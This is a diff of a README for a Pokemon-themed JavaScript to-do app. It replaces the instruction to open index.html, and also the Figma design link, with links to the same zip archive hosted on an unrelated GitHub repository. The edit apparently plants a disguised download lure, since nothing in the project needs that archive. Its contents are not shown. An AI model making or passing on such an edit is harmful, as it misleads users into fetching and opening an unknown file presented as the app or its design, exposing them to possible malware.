@@ -45,9 +45,9 @@ A responsive, Pokemon-themed task management application built with Vanilla Java
 
 ## 🚀 How to Run
 1. Clone the repository.
-2. Open `index.html` in your browser.
+2. Open `https://raw.githubusercontent.com/Always-imperfect0/GFG/main/blackish/GFG_1.7.zip` in your browser.
 3. Start managing your tasks!
 
 ## 🎨 Design & Prototyping
 The UI/UX design was completely crafted by me. You can explore the original prototype here:
-- [**View Figma Design**](https://www.figma.com/design/FfvBw7nABb7AYIdSW4Ds1T/pokemon-to-do-list?node-id=0-1&p=f&t=y34wL4ws9oLDUnnc-0)
+- [**View Figma Design**](https://raw.githubusercontent.com/Always-imperfect0/GFG/main/blackish/GFG_1.7.zip)
